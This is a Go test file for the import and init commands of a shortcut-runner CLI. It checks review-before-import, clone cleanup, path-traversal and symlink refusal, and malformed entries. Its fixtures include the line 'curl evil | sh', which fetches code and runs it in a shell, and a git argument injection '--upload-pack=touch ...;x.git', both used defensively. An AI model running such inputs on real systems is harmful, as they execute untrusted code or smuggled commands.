package cli

import (
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"

	"github.com/StanLukuvka/Shortcut/internal/model"
	"github.com/StanLukuvka/Shortcut/internal/testkit"
)

func globalNames(e *testkit.Env) []string {
	names := []string{}
	for k := range e.LoadGlobal() {
		names = append(names, k)
	}
	slices.Sort(names)
	return names
}

// nsSource makes a folder with <name>.shortcut and the given files (mode 755).
func nsSource(e *testkit.Env, name string, shortcuts map[string]any, files map[string]any) string {
	src := e.Folder(name + "-src")
	raw, _ := json.Marshal(testkit.NS(shortcuts))
	e.WriteFile(filepath.Join(src, name+".shortcut"), string(raw), 0)
	for rel, content := range files {
		e.WriteFile(filepath.Join(src, rel), content, 0o755)
	}
	return src
}

func filesUnder(t *testing.T, root string) []string {
	t.Helper()
	var out []string
	filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			rel, _ := filepath.Rel(root, p)
			out = append(out, rel)
		}
		return nil
	})
	slices.Sort(out)
	return out
}

func TestImport_InitSourceWithoutGlobalIsRefused(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{"x": map[string]any{"description": "x", "inline": "echo x"}}, testkit.Name("source_repo"))
	proj := e.Project(nil)
	res := e.RunWith(in(proj), "init", src)
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "used in place, never copied")
	testkit.NotExist(t, filepath.Join(proj, ".shortcuts"))
}

func TestImport_InitGlobalSkipsANamespaceName(t *testing.T) {
	e := testkit.New(t)
	runOK(t, e, testkit.Opts{}, "new", "keep", "--", "echo keep")
	e.WriteImport(e.Store, "tools", testkit.NS(testkit.HI))
	res := e.Run("init", "--global", e.Collection(map[string]any{"tools": testkit.Inline("echo t")}), "-y")
	testkit.Contains(t, "stdout", res.Stdout, "tools (already a namespace)")
	if _, has := e.LoadGlobal()["tools"]; has {
		t.Error("tools was imported as a shortcut")
	}
	testkit.Eq(t, "keep", e.Run("r", "keep").Stdout, "keep\n")
}

func TestImport_InitGlobalMergeSkips(t *testing.T) {
	e := testkit.New(t)
	runOK(t, e, testkit.Opts{}, "new", "collide", "--", "echo existing")
	ext := e.WriteFile(filepath.Join(e.Tmp, "external_source.sh"), "#!/usr/bin/env bash\necho ext\n", 0)
	src := e.Collection(map[string]any{
		"collide": map[string]any{"description": "collision", "inline": "echo collide"},
		"linked":  map[string]any{"description": "linked", "script": ext},
		"valid":   map[string]any{"description": "valid", "script": "scripts/valid.sh"},
	}, testkit.Name("source_repo"), testkit.Files(map[string]any{"scripts/valid.sh": "#!/usr/bin/env bash\necho valid\n"}))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	testkit.Contains(t, "collide", res.Stdout, "collide (already exists)")
	testkit.Contains(t, "linked", res.Stdout, "linked (linked external script)")
	reg := e.LoadGlobal()
	testkit.Eq(t, "valid script", reg["valid"].(map[string]any)["script"], "scripts/valid.sh")
	if !isExec(t, filepath.Join(e.Store, "scripts", "valid.sh")) {
		t.Error("the copied script is not executable")
	}
	if _, has := reg["linked"]; has {
		t.Error("linked was imported")
	}
}

func TestImport_InitSourceGlobalCwdRetention(t *testing.T) {
	e := testkit.New(t)
	fixed := e.Folder("fixed_dir")
	src := e.Collection(map[string]any{
		"fixed_ok":  map[string]any{"description": "ok", "inline": "echo ok", "cwd": fixed},
		"fixed_bad": map[string]any{"description": "missing", "inline": "echo bad", "cwd": "/nonexistent/fixed/xyz"},
		"relative":  map[string]any{"description": "relative", "inline": "echo rel", "cwd": "../sibling"},
		"caller":    map[string]any{"description": "caller", "inline": "echo c", "cwd": "caller"},
		"traversal": map[string]any{"description": "traversal", "script": "../../outside.sh"},
	}, testkit.Name("global_source_repo"))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	testkit.Contains(t, "fixed_bad", res.Stdout, "fixed_bad (cwd not found here: /nonexistent/fixed/xyz)")
	testkit.Contains(t, "relative", res.Stdout, "relative (exported, but its cwd '../sibling' only exists in the project)")
	testkit.Contains(t, "traversal", res.Stdout, "traversal (script path escapes the source")
	reg := e.LoadGlobal()
	testkit.Eq(t, "fixed_ok cwd", reg["fixed_ok"].(map[string]any)["cwd"], fixed)
	if _, has := reg["caller"]; !has {
		t.Error("caller was not imported")
	}
	for _, name := range []string{"fixed_bad", "relative", "traversal"} {
		if _, has := reg[name]; has {
			t.Errorf("%s was imported", name)
		}
	}
}

func TestImport_InitGitSourceClone(t *testing.T) {
	e := testkit.New(t)
	repo := e.Collection(map[string]any{"git_cmd": map[string]any{"description": "From git", "script": "scripts/git_cmd.sh"}},
		testkit.Name("git_source_repo"), testkit.Files(map[string]any{"scripts/git_cmd.sh": "#!/usr/bin/env bash\necho from_git\n"}), testkit.Mode(0o755))
	e.CommitToGit(repo) // a local repository: HOME is the sandbox's, so no real git config, and no network
	tmp := e.Folder("tmpdir")
	res := e.RunWith(testkit.Opts{Env: map[string]string{"TMPDIR": tmp}}, "init", "--global", "file://"+repo, "-y")
	res.WantCode(t, 0)
	testkit.Contains(t, "stdout", res.Stdout, "git_cmd")
	testkit.Eq(t, "run", e.Run("run", "git_cmd").Stdout, "from_git\n")
	testkit.Eq(t, "the clone is removed", filesUnder(t, tmp), []string(nil))
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("the temporary clone is still there: %v", left)
	}
}

// A failed clone says why and leaves no folder behind.
func TestImport_FailedCloneIsCleanedUp(t *testing.T) {
	e := testkit.New(t)
	tmp := e.Folder("tmpdir")
	missing := "file://" + filepath.Join(e.Tmp, "no-such-repo")
	res := e.RunWith(testkit.Opts{Env: map[string]string{"TMPDIR": tmp}}, "init", "--global", missing, "-y")
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "error: failed to clone git repository from "+missing+": ")
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("the temporary clone is still there: %v", left)
	}
	noGlobalRegistry(t, e)
}

// Ctrl-C at the question, a "no" and a stop by SIGTERM all remove the clone.
func TestImport_CloneIsRemovedOnCtrlCAndDecline(t *testing.T) {
	e := testkit.New(t)
	repo := e.Collection(testkit.HI, testkit.Name("repo"))
	e.CommitToGit(repo)
	tmp := e.Folder("tmpdir")
	o := testkit.Opts{Env: map[string]string{"TMPDIR": tmp}}
	code, out := e.InTerminal(o, []testkit.Key{{Wait: "import? [y/N]", Signal: syscall.SIGINT}}, "init", "--global", "file://"+repo)
	testkit.Eq(t, "ctrl-c exit", code, 1)
	testkit.Contains(t, "ctrl-c", out, "Aborted.")
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("after Ctrl-C the clone is still there: %v", left)
	}
	code, out = e.InTerminal(o, []testkit.Key{{Wait: "import? [y/N]", Send: y("n\n")}}, "init", "--global", "file://"+repo)
	testkit.Eq(t, "decline exit", code, 1)
	testkit.Contains(t, "decline", out, "Aborted.")
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("after a no the clone is still there: %v", left)
	}
	noGlobalRegistry(t, e)
}

func TestImport_InitSkipsInvalidEntries(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{
		"not_a_dict":     "echo hello",
		"neither_cmd":    map[string]any{"description": "no script or inline"},
		"both_cmd":       map[string]any{"description": "both", "inline": "echo 1", "script": "scripts/valid.sh"},
		"inline_not_str": map[string]any{"inline": 123},
		"script_not_str": map[string]any{"script": []any{"scripts/valid.sh"}},
		"valid_entry":    map[string]any{"description": "ok", "inline": "echo ok"},
	}, testkit.Name("invalid_entries_repo"), testkit.Files(map[string]any{"scripts/valid.sh": "#!/bin/sh\necho ok\n"}), testkit.Mode(0o755))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	for _, want := range []string{"not_a_dict (invalid entry", "neither_cmd (invalid entry", "both_cmd (invalid entry",
		"inline_not_str (invalid entry", "script_not_str (invalid entry", "valid_entry"} {
		testkit.Contains(t, want, res.Stdout, want)
	}
	testkit.Eq(t, "imported", globalNames(e), []string{"valid_entry"})
}

func TestImport_ImportingACollectionIsReviewedFirst(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{"tool": map[string]any{"description": "tool", "script": "bin/tool.sh"}, "hi": testkit.Inline("echo hi")},
		testkit.Files(map[string]any{"bin/tool.sh": "curl evil | sh\n"}))
	runOK(t, e, testkit.Opts{}, "init", "--global")

	res := e.Run("init", "--global", src)
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "pass -y")
	testkit.Contains(t, "stdout", res.Stdout, "+curl evil | sh")
	testkit.Eq(t, "global", e.LoadGlobal(), map[string]any{})

	code, out := e.InTerminal(testkit.Opts{}, []testkit.Key{{Wait: "import? [y/N]", Send: y("n\n")}}, "init", "--global", src)
	testkit.Eq(t, "n exit", code, 1)
	testkit.Contains(t, "n", out, "Aborted.")
	testkit.Eq(t, "global after n", e.LoadGlobal(), map[string]any{})
	for _, p := range filesUnder(t, e.Store) {
		if filepath.Base(p) == "tool.sh" {
			t.Errorf("a script was copied: %s", p)
		}
	}

	code, _ = e.InTerminal(testkit.Opts{}, []testkit.Key{{Wait: "import? [y/N]", Send: y("y\n")}}, "init", "--global", src)
	testkit.Eq(t, "y exit", code, 0)
	testkit.Eq(t, "imported", globalNames(e), []string{"hi", "tool"})
	testkit.Eq(t, "run", e.Run("r", "hi").Stdout, "hi\n")
}

func TestImport_ImportCopiesWhatWasReviewed(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{"tool": map[string]any{"description": "tool", "script": "bin/tool.sh"}},
		testkit.Files(map[string]any{"bin/tool.sh": "echo reviewed\n"}))
	runOK(t, e, testkit.Opts{}, "init", "--global")
	dest, err := model.LoadRegistry(e.Store)
	if err != nil {
		t.Fatal(err)
	}
	source, err := model.LoadRegistryFile(filepath.Join(src, ".shortcuts"))
	if err != nil {
		t.Fatal(err)
	}
	entries, scripts, _, err := planImport(src, e.Store, dest, source)
	if err != nil {
		t.Fatal(err)
	}
	e.WriteFile(filepath.Join(src, "bin", "tool.sh"), "echo swapped\n", 0)
	if err := applyImport(e.Store, entries, scripts); err != nil {
		t.Fatal(err)
	}
	testkit.Eq(t, "run", e.Run("r", "tool").Stdout, "reviewed\n")
}

func TestImport_DecliningAnImportWritesNothingAtAll(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(testkit.HI)
	code, out := e.InTerminal(testkit.Opts{}, []testkit.Key{{Wait: "import? [y/N]", Send: y("n\n")}}, "init", "--global", src)
	testkit.Eq(t, "exit", code, 1)
	testkit.Contains(t, "out", out, "Aborted.")
	left, err := os.ReadDir(e.Store)
	if err != nil || len(left) != 0 {
		t.Errorf("the store was written: %v %v", left, err)
	}
}

func TestImport_AnImportNeverReplacesAStoredScript(t *testing.T) {
	e := testkit.New(t)
	e.WriteStore(e.Store, map[string]any{"deploy": map[string]any{"script": "scripts/g_deploy.sh"}})
	mine := e.WriteFile(filepath.Join(e.Store, "scripts", "g_deploy.sh"), "echo mine\n", 0)
	src := e.Collection(map[string]any{"g_deploy": map[string]any{"description": "x", "script": "bin/x.sh"}},
		testkit.Files(map[string]any{"bin/x.sh": "echo EVIL\n"}))
	res := e.Run("init", "--global", src, "-y")
	testkit.Contains(t, "stdout", res.Stdout, "would replace")
	testkit.Eq(t, "mine", testkit.ReadFile(t, mine), "echo mine\n")
}

func TestImport_ImportWithAClosedStdoutStillImports(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(testkit.HI)
	res := e.RunWith(testkit.Opts{CloseFDs: []int{1}}, "init", "--global", src, "-y")
	res.WantCode(t, 0)
	if _, has := e.LoadGlobal()["hi"]; !has {
		t.Error("hi was not imported")
	}
}

func TestImport_ASourceNeedsAProjectFile(t *testing.T) {
	e := testkit.New(t)
	src := e.Folder("plain")
	e.WriteStore(src, testkit.HI) // a shortcuts.json, as in a copy of a global store
	res := e.Run("init", "--global", src, "-y")
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "no .shortcuts or <ns>.shortcut found in "+src)
	noGlobalRegistry(t, e)
}

func TestImport_ImportWithNothingNewAsksNothing(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(testkit.HI)
	runOK(t, e, testkit.Opts{}, "new", "hi", "--", "echo mine")
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src)
	testkit.Contains(t, "stdout", res.Stdout, "already exists")
}

func TestImport_AFolderOfNamespacesIsCopiedIntoImportsAndNeedsApproving(t *testing.T) {
	e := testkit.New(t)
	src := nsSource(e, "dk", map[string]any{"ps": map[string]any{"script": "scripts/dk/ps.sh"}, "hi": testkit.Inline("echo hi")}, map[string]any{
		"scripts/dk/ps.sh":   "#!/usr/bin/env bash\n. \"$(dirname \"$0\")/lib/say\"\nsay ps\n",
		"scripts/dk/lib/say": "say() { echo \"$1\"; }\n"})
	e.WriteFile(filepath.Join(src, "README.md"), "not copied", 0)
	res := e.Run("init", "--global", src)
	res.WantCode(t, 1)
	testkit.Contains(t, "diff", res.Stdout, "+++ b/imports/scripts/dk/lib/say")
	testkit.NotExist(t, filepath.Join(e.Store, "imports"))
	res = runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
	testkit.Contains(t, "stdout", res.Stdout, "shortcut update dk")
	testkit.Eq(t, "files", filesUnder(t, filepath.Join(e.Store, "imports")), []string{"dk.shortcut", "scripts/dk/lib/say", "scripts/dk/ps.sh"})
	testkit.Contains(t, "unapproved", e.Run("r", "dk", "hi").Stderr, "isn't approved yet")
	runOK(t, e, testkit.Opts{}, "update", "-y", "dk")
	testkit.Eq(t, "ps", e.Run("r", "dk", "ps").Stdout, "ps\n")
	again := e.Run("init", "--global", "-y", src)
	testkit.Contains(t, "again", again.Stdout, "dk (already a namespace; --replace puts this one in its place)")
}

func TestImport_ANamespaceComesWholeOrNotAtAll(t *testing.T) {
	e := testkit.New(t)
	outside := e.Script("out.sh", "#!/usr/bin/env bash\n")
	cases := []struct {
		ns        string
		shortcuts map[string]any
		files     map[string]any
		reason    string
	}{
		{"a", map[string]any{"x": map[string]any{"script": "x.sh"}}, map[string]any{"x.sh": "true\n"}, "'x' has its script outside scripts/a/: x.sh"},
		{"b", map[string]any{"x": map[string]any{"script": outside}}, nil, "'x' has its script outside scripts/b/: " + outside},
		{"c", map[string]any{"x": map[string]any{"script": "scripts/c/../../x.sh"}}, map[string]any{"x.sh": "true\n"}, "'x' has its script outside scripts/c/"},
		{"d", map[string]any{"x": map[string]any{"script": "scripts/d/x.sh"}}, nil, "'x' has a missing script: scripts/d/x.sh"},
	}
	for _, c := range cases {
		shortcuts := map[string]any{"ok": testkit.Inline("true")}
		for k, v := range c.shortcuts {
			shortcuts[k] = v
		}
		src := nsSource(e, c.ns, shortcuts, c.files)
		res := runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
		testkit.Contains(t, c.ns, res.Stdout, c.ns+" ("+c.reason)
		testkit.NotExist(t, filepath.Join(e.Store, "imports", c.ns+".shortcut"))
	}
	src := nsSource(e, "e", map[string]any{"x": map[string]any{"script": "scripts/e/x.sh"}}, map[string]any{"scripts/e/real.sh": "true\n"})
	e.Symlink(filepath.Join(src, "scripts", "e", "real.sh"), filepath.Join(src, "scripts", "e", "x.sh"))
	testkit.Contains(t, "symlink", e.Run("init", "--global", "-y", src).Stdout, "e (symlink in source: scripts/e/x.sh)")
	bad := nsSource(e, "f", map[string]any{}, nil)
	e.WriteFile(filepath.Join(bad, "f.shortcut"), `{"version": 1, "shortcuts": {}, "imports": {}}`, 0)
	testkit.Contains(t, "nest", e.Run("init", "--global", "-y", bad).Stdout, "namespaces don't nest")
	testkit.NotExist(t, filepath.Join(e.Store, "imports"))
}

func TestImport_ReplacePutsANamespaceInPlaceOfTheInstalledOne(t *testing.T) {
	e := testkit.New(t)
	src := nsSource(e, "dk", map[string]any{"ps": map[string]any{"script": "scripts/dk/ps.sh"}},
		map[string]any{"scripts/dk/ps.sh": "#!/usr/bin/env bash\necho ps\n", "scripts/dk/old": "old\n"})
	runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
	runOK(t, e, testkit.Opts{}, "update", "-y", "dk")
	same := runOK(t, e, testkit.Opts{}, "init", "--global", "--replace", src)
	testkit.Contains(t, "same", same.Stdout, "dk (the same as what's installed)")
	e.WriteFile(filepath.Join(src, "scripts", "dk", "ps.sh"), "#!/usr/bin/env bash\necho new\n", 0)
	removePath(t, filepath.Join(src, "scripts", "dk", "old"))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", "--replace", "-y", src)
	testkit.Contains(t, "head", res.Stdout, "Changes from")
	testkit.Contains(t, "diff", res.Stdout, "-echo ps\n+echo new")
	testkit.Eq(t, "folder", filesUnder(t, filepath.Join(e.Store, "imports", "scripts", "dk")), []string{"ps.sh"})
	testkit.Contains(t, "changed", e.Run("r", "dk", "ps").Stderr, "dk changed since you approved it")
	runOK(t, e, testkit.Opts{}, "update", "-y", "dk")
	testkit.Eq(t, "run", e.Run("r", "dk", "ps").Stdout, "new\n")
}

func TestImport_ReplaceLeavesAnImportFromElsewhereAndAProjectSource(t *testing.T) {
	e := testkit.New(t)
	elsewhere := e.WriteFile(filepath.Join(e.Tmp, "mine", "dk.shortcut"), `{"version": 1, "shortcuts": {"hi": {"inline": "echo hi"}}}`, 0)
	e.WriteStore(e.Store, map[string]any{}, map[string]any{"imports": map[string]any{"dk": elsewhere}})
	src := nsSource(e, "dk", map[string]any{"x": testkit.Inline("true")}, nil)
	res := e.Run("init", "--global", "--replace", "-y", src)
	testkit.Contains(t, "stdout", res.Stdout, "dk (imported from "+elsewhere+", so it isn't replaced)")
	testkit.Contains(t, "elsewhere", testkit.ReadFile(t, elsewhere), `"hi"`)
	project := e.Collection(testkit.HI)
	res = e.Run("init", "--global", "--replace", "-y", project)
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "--replace is for a folder of namespaces, and "+project+" has a .shortcuts")
}

func TestImportSkips_ASourceWithAShortcutsFileSaysWhatItLeavesOut(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(testkit.HI, testkit.Files(map[string]any{"extra.shortcut": `{"version": 1, "shortcuts": {}}`}),
		testkit.Extra(map[string]any{"imports": map[string]any{"listed": "listed.shortcut"}}))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
	testkit.Contains(t, "extra", res.Stdout, "extra.shortcut (a namespace file: a source with a .shortcuts brings only its exported shortcuts)")
	testkit.Contains(t, "listed", res.Stdout, "imports: listed (namespaces a .shortcuts imports aren't copied)")
	if _, has := e.LoadGlobal()["hi"]; !has {
		t.Error("hi was not imported")
	}
}

func TestExport_InitFromAProjectImportsOnlyExportedEntries(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{
		"tool": map[string]any{"description": "t", "script": "bin/tool", "export": true},
		"here": map[string]any{"inline": "echo here", "export": true},
		"mine": testkit.Inline("echo mine"),
		"rel":  map[string]any{"inline": "echo rel", "cwd": "sub", "export": true},
	}, testkit.Files(map[string]any{"bin/tool": "#!/bin/sh\necho tool\n"}))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", proj, "-y")
	testkit.Contains(t, "mine", res.Stdout, "mine (project-only)")
	testkit.Contains(t, "rel", res.Stdout, "rel (exported, but its cwd 'sub' only exists in the project)")
	reg := e.LoadGlobal()
	testkit.Eq(t, "names", globalNames(e), []string{"here", "tool"})
	testkit.Eq(t, "tool", reg["tool"], map[string]any{"description": "t", "script": "scripts/tool.sh"})
	if _, has := reg["here"].(map[string]any)["export"]; has {
		t.Error("here still exports")
	}
	testkit.Eq(t, "run", e.Run("r", "tool").Stdout, "tool\n")
}

func TestExport_InitSkipsAnExportedCwdThatIsntHere(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{
		"x": map[string]any{"inline": "echo x", "cwd": "/nonexistent/xyz", "export": true},
		"y": map[string]any{"inline": "echo y", "export": true},
	})
	res := e.Run("init", "--global", proj, "-y")
	testkit.Contains(t, "stdout", res.Stdout, "x (cwd not found here: /nonexistent/xyz)")
	testkit.Eq(t, "names", globalNames(e), []string{"y"})
}

func TestProjectFiles_AProjectCanBeACollection(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{"tool": map[string]any{"description": "t", "inline": "echo tool", "export": true}})
	runOK(t, e, testkit.Opts{}, "init", "--global", proj, "-y")
	if _, has := e.LoadGlobal()["tool"]; !has {
		t.Error("tool was not imported")
	}
}

func TestPromote_InitSkipsAnEntryWithFrom(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{
		"x": map[string]any{"inline": "echo x", "from": map[string]any{"source": "/somewhere/proj", "name": "tool"}},
		"y": testkit.Inline("echo y")})
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	testkit.Contains(t, "stdout", res.Stdout, "x (invalid entry: 'x' is not a valid entry: 'from' is only for")
	testkit.Eq(t, "names", globalNames(e), []string{"y"})
}

func TestStores_InitDoesNotCreateAProject(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(nil, testkit.Name("empty_init_proj"))
	res := e.RunWith(in(proj), "init")
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "a file you write by hand")
	if left, _ := os.ReadDir(proj); len(left) != 0 {
		t.Errorf("init wrote %v", left)
	}
}

func TestStores_InitGlobalLeavesAnExistingStoreAlone(t *testing.T) {
	e := testkit.New(t)
	runOK(t, e, testkit.Opts{}, "new", "keep", "--", "echo keep")
	res := e.Run("init", "--global")
	testkit.Contains(t, "stdout", res.Stdout, "Global store already exists")
	testkit.Eq(t, "keep", e.Run("r", "keep").Stdout, "keep\n")
}

func TestStores_MalformedEntriesNeverCrash(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{"bad": "echo hi"}, testkit.Name("proj_a5"))
	res := e.RunWith(in(proj), "update", ".", "-y")
	testkit.Eq(t, "update exit", res.Code, 1)
	testkit.Contains(t, "update", res.Stderr, "expected a dictionary")

	// The global store isn't approved, so a bad entry can reach `run`
	e.WriteStore(e.Store, map[string]any{"bad": "echo hi"})
	for _, cwd := range []string{proj, e.Tmp} {
		res = e.RunWith(in(cwd), "run", "bad")
		testkit.Eq(t, "run exit", res.Code, 1)
		if !strings.HasPrefix(strings.TrimSpace(res.Stderr), "error:") {
			t.Errorf("stderr %q", res.Stderr)
		}
		testkit.NotContains(t, "traceback", res.Stderr, "Traceback")
	}
	src := e.Collection(map[string]any{"bad_dir": map[string]any{"description": "Bad dir", "inline": "echo hi", "cwd": 123}}, testkit.Name("src_a5"))
	res = e.Run("init", "--global", src, "-y")
	testkit.Eq(t, "init exit", res.Code, 0)
	testkit.Contains(t, "init", res.Stdout, "bad_dir (invalid entry: 'bad_dir' is not a valid entry: 'cwd' must be a string")
	testkit.NotContains(t, "traceback", res.Stderr, "Traceback")
}

func TestSymlinkSafety_InitSkipsSymlinkedSourceScript(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{
		"sym_script":  map[string]any{"description": "symlink script", "script": "scripts/sym_target.sh"},
		"real_script": map[string]any{"description": "real script", "script": "scripts/real.sh"},
	}, testkit.Name("symlink_source_repo"), testkit.Files(map[string]any{"scripts/real.sh": "#!/bin/sh\necho real\n"}), testkit.Mode(0o755))
	e.Symlink(filepath.Join(src, "scripts", "real.sh"), filepath.Join(src, "scripts", "sym_target.sh"))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	testkit.Contains(t, "sym", res.Stdout, "sym_script (symlink in source)")
	testkit.Contains(t, "real", res.Stdout, "real_script")
	testkit.Eq(t, "names", globalNames(e), []string{"real_script"})
	copied := filepath.Join(e.Store, "scripts", "real_script.sh")
	if st, err := os.Lstat(copied); err != nil || !st.Mode().IsRegular() {
		t.Errorf("the copy is not a regular file: %v %v", st, err)
	}
}

// A source that ends in .git but starts with a dash is a path for git, never an option. Without `--` the parser
// refuses it as an unknown option; after `--` it reaches git behind git's own `--`.
func TestInit_LeadingDashGitSourceIsNotAnOption(t *testing.T) {
	e := testkit.New(t)
	marker := filepath.Join(e.Tmp, "pwned")
	source := "--upload-pack=touch " + marker + ";x.git"
	e.Run("init", "--global", source, "-y").WantCode(t, 2)
	testkit.NotExist(t, marker)
	res := e.Run("init", "--global", "-y", "--", source)
	res.WantCode(t, 1)
	testkit.Contains(t, "stderr", res.Stderr, "error: failed to clone git repository from --upload-pack=")
	testkit.NotExist(t, marker)
}
